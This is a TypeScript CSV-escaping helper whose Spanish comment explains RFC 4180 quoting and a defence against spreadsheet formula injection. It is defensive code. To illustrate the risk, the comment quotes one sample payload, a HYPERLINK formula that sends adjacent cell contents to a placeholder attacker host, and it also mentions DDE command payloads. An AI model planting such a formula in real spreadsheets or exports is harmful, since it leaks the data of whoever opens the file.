/**
 * Escapa un valor para una celda de CSV: comillas de RFC 4180 y neutralización de fórmulas.
 *
 * El comillado por sí solo NO evita la inyección de fórmulas (CN-012). `title`, `copy_text` y
 * `reference_link` son texto libre que escriben usuarios, y el export lo abre otra gente de la
 * agencia -- y clientes -- en Excel, LibreOffice o Google Sheets. Un título como
 * `=HYPERLINK("https://evil.example.com?d="&A1,"Ver")` se lleva el contenido de las celdas vecinas
 * al abrir el archivo, y un payload DDE intenta ejecutar comandos.
 *
 * La mitigación estándar es neutralizar el primer carácter, no el comillado: se antepone un
 * apóstrofo, que la hoja de cálculo lee como "esto es texto". Se hace ANTES de comillar para que el
 * apóstrofo quede dentro de las comillas y no rompa el formato del archivo.
 *
 * `\t` y `\r` están en la lista porque algunas hojas de cálculo los ignoran al principio de la celda
 * y evalúan lo que sigue.
 */
export function csvEscape(value: string) {
  const v = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  if (/[",\n]/.test(v)) {
    return `"${v.replace(/"/g, '""')}"`;
  }
  return v;
}
